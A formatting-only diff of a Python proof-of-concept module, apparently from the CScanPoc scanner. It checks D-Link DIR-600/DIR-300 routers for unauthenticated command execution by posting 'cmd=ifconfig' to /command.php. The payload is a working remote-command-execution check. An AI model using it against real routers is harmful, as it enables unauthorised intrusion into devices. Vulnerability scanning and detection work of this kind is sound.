@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'D-Link_0003' # 平台漏洞编号，留空
+    vuln_id = 'D-Link_0003'  # 平台漏洞编号，留空
     name = 'D-Link Command_Execution'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = ' 2013-02-04'  # 漏洞公布时间
     desc = '''
         D-Link® introduces the Wireless 150 Router (DIR-600), which delivers high performance end-to-end wireless connectivity based on 802.11n technology. 
@@ -22,6 +23,7 @@ class Vuln(ABVuln):
     product = 'D-Link'  # 漏洞应用名称
     product_version = 'DIR-600/DIR_300'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'daad711a-f881-483d-965b-8e1528e1a8cc'
     author = '47bwy'  # POC编写者
@@ -34,11 +36,11 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             url = self.target + '/command.php'
             postpayload = 'cmd=ifconfig'
-            code, head, res, errcode, _ = hh.http(url,postpayload)
+            code, head, res, errcode, _ = hh.http(url, postpayload)
             if code == 200 and "Ethernet  HWaddr" in res:
                 #security_hole('Find Command_Execution:' + url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -49,6 +51,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
